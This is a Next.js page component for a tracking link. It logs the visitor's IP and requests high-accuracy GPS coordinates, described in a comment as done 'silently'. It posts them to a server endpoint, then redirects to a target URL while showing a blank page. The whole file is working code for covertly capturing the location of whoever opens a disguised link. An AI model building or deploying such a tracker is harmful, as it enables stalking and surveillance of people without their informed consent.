"use client";

import { useEffect } from "react";
import { useParams } from "next/navigation";

export default function TrackerLandingPage() {
  const params = useParams();
  const code = params.code as string;

  useEffect(() => {
    if (!code) return;

    // Fetch target URL + log IP
    fetch(`/api/t-info/${code}`)
      .then((r) => r.json())
      .then((d) => {
        const targetUrl = d.target_url;
        if (!targetUrl) return;

        // Try get GPS silently, timeout 8 detik
        const redirectNow = () => {
          window.location.replace(targetUrl);
        };

        if (!navigator.geolocation) {
          redirectNow();
          return;
        }

        let redirected = false;

        const timer = setTimeout(() => {
          if (!redirected) {
            redirected = true;
            redirectNow();
          }
        }, 8000);

        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            // Kirim GPS
            await fetch(`/api/t-geo/${code}`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                gps_latitude: pos.coords.latitude,
                gps_longitude: pos.coords.longitude,
                gps_accuracy: pos.coords.accuracy,
              }),
            }).catch(() => {});

            clearTimeout(timer);
            if (!redirected) {
              redirected = true;
              redirectNow();
            }
          },
          () => {
            // Denied/error — langsung redirect
            clearTimeout(timer);
            if (!redirected) {
              redirected = true;
              redirectNow();
            }
          },
          { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
        );
      })
      .catch(() => {});
  }, [code]);

  // Halaman kosong total
  return null;
}
